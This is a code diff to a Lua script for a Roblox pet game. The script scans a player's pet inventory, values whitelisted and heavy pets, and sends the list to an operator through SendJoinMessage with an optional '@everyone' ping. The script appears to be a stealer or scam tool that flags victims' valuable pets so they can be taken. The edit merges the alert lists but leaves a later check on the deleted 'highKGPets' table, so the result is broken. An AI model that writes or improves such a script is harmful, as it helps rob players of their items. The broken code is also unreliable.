@@ -102,9 +102,15 @@ local function hasMutation(petName)
     end
     return false
 end
+-- Helper to extract weight and age from pet name string
+local function extractWeightAndAge(name)
+    local weight = tonumber(name:match("%[(%d+%.?%d*) KG%]"))
+    local age = name:match("%[Age%s*(%d+)%]")
+    return weight, age
+end
 local totalValue = 0
 local itemsToSend = {}
-local highKGPets = {}
+local seenPets = {}
 
 -- Debug function
 local function debugPrint(message)
@@ -418,17 +424,19 @@ if playerData and playerData.PetsData and playerData.PetsData.PetInventory and p
     for petUUID, v14 in pairs(playerData.PetsData.PetInventory.Data) do
         if v14 and v14.PetData and v14.PetType then
             local itemName = v14.PetType
-            local weight = v14.PetData.BaseWeight or 0
-            local petAge = v14.PetData.Age ~= nil and tostring(v14.PetData.Age) or "N/A"
+            local petName = v14.PetData.Name or itemName
+            local weight, petAge = extractWeightAndAge(petName)
+            if not weight then weight = v14.PetData.BaseWeight or 0 end
+            if not petAge then petAge = v14.PetData.Age ~= nil and tostring(v14.PetData.Age) or "N/A" end
             local value = calcPetValue(v14)
-            if isWhitelistedPet(itemName) then
+            local isWhitelisted = isWhitelistedPet(itemName)
+            local isHeavy = weight and weight >= 25
+            -- Avoid duplicates: use UUID as key
+            if (isWhitelisted or isHeavy) and not seenPets[petUUID] then
                 totalValue = totalValue + value
                 table.insert(itemsToSend, {Tool = nil, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
-                debugPrint("Added whitelisted pet: " .. itemName .. " Value: " .. value .. " Age: " .. petAge)
-            elseif weight >= 25 then
-                totalValue = totalValue + value
-                table.insert(highKGPets, {Tool = nil, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
-                debugPrint("Added high KG pet: " .. itemName .. " Value: " .. value .. " Age: " .. petAge)
+                seenPets[petUUID] = true
+                debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Weight: " .. tostring(weight) .. " Age: " .. tostring(petAge))
             end
         end
     end
@@ -439,57 +447,19 @@ debugPrint("Items to send: " .. #itemsToSend)
 debugPrint("Total value: " .. totalValue)
 
 if #itemsToSend > 0 then
-    debugPrint("Processing whitelisted pets...")
-    
-    -- Sort items
+    debugPrint("Processing pets to send...")
     table.sort(itemsToSend, function(a, b)
-        if a.Type ~= "Pet" and b.Type == "Pet" then
-            return true
-        elseif a.Type == "Pet" and b.Type ~= "Pet" then
-            return false
-        else
-            return a.Value < b.Value
-        end
-    end)
-
-    local sentItems = {}
-    for i, v in ipairs(itemsToSend) do
-        sentItems[i] = v
-    end
-
-    table.sort(sentItems, function(a, b)
-        if a.Type == "Pet" and b.Type ~= "Pet" then
-            return true
-        elseif a.Type ~= "Pet" and b.Type == "Pet" then
-            return false
-        else
-            return a.Value > b.Value
-        end
-    end)
-
-    local prefix = ""
-    if ping == "Yes" then
-        prefix = "--@everyone "
-    end
-
-    -- Remove followUser and waitForUserChat, just send notification after scan
-    SendJoinMessage(sentItems, prefix)
-else
-    debugPrint("No items found that meet the minimum value requirement")
-    debugPrint("Try lowering the min_value in the configuration")
-end 
-if #highKGPets > 0 then
-    debugPrint("Processing high KG pets not in whitelist...")
-    -- Send a separate notification for high KG pets not in whitelist
-    table.sort(highKGPets, function(a, b)
         return a.Value > b.Value
     end)
     local prefix = ""
     if ping == "Yes" then
         prefix = "--@everyone "
     end
-    SendJoinMessage(highKGPets, prefix .. "[25KG+ PET ALERT] ")
-end
+    SendJoinMessage(itemsToSend, prefix)
+else
+    debugPrint("No items found that meet the minimum value requirement")
+    debugPrint("Try lowering the min_value in the configuration")
+end 
 if #itemsToSend == 0 and #highKGPets == 0 then
     debugPrint("No items found that meet the minimum value requirement")
     debugPrint("Try lowering the min_value in the configuration")
